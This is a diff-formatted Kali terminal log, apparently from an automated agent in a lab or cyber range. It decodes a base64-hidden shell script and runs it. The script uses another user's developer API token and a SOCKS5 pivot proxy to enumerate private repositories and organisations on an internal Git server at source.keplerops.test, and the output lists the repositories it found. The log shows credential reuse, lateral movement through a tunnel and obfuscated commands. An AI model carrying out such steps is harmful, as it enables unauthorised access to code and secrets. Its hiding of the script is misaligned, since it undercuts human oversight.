@@ -1,0 +1,18 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/g1.sh <<'B64EOF'
+> c2V0ICtlClA9Ii0tc29ja3M1LWhvc3RuYW1lIDEyNy4wLjAuMToxMDgwIjsgSz0iLWsgLXNTIC1tIDQwIgpHPWh0dHBzOi8vc291cmNlLmtlcGxlcm9wcy50ZXN0ClU9cm93YW4uaXRvClQ9ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvCmVjaG8gIj09IHJlcG9zIgpjdXJsICRLICRQIC11ICIkVTokVCIgIiRHL2FwaS92MS91c2VyL3JlcG9zP2xpbWl0PTEwMCIgLW8gL3RtcC9yZXBvcy5qc29uIC13ICJbJXtodHRwX2NvZGV9ICV7c2l6ZV9kb3dubG9hZH1dXG4iCnB5dGhvbjMgLSA8PCdQWScKaW1wb3J0IGpzb24KdHJ5OgogZD1qc29uLmxvYWQob3BlbignL3RtcC9yZXBvcy5qc29uJykpCiBmb3IgciBpbiBkOiBwcmludChyWydmdWxsX25hbWUnXSwgci5nZXQoJ2Rlc2NyaXB0aW9uJykpCmV4Y2VwdCBFeGNlcHRpb24gYXMgZTogcHJpbnQoJ0VSUicsZSwgb3BlbignL3RtcC9yZXBvcy5qc29uJykucmVhZCgpWzo1MDBdKQpQWQplY2hvICI9PSBvcmdzIgpjdXJsICRLICRQIC11ICIkVTokVCIgIiRHL2FwaS92MS91c2VyL29yZ3MiIHwgaGVhZCAtYyAxMDAwCmVjaG8gRE9ORQo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/g1.sh; bash /tmp/g1.sh; echo DONEMARK_1795211605647$((6*7))
+== repos
+[200 9628]
+fieldkest/connector-archive Supported connector archive and maintenance records
+fieldkest/fieldlink-connector FieldLink customer connector and delivery notes
+fieldkest/policy-compiler Retained policy compiler and migration examples
+fieldkest/release-signer-history Release signing history and rollover records
+== orgs
+[]
+DONE
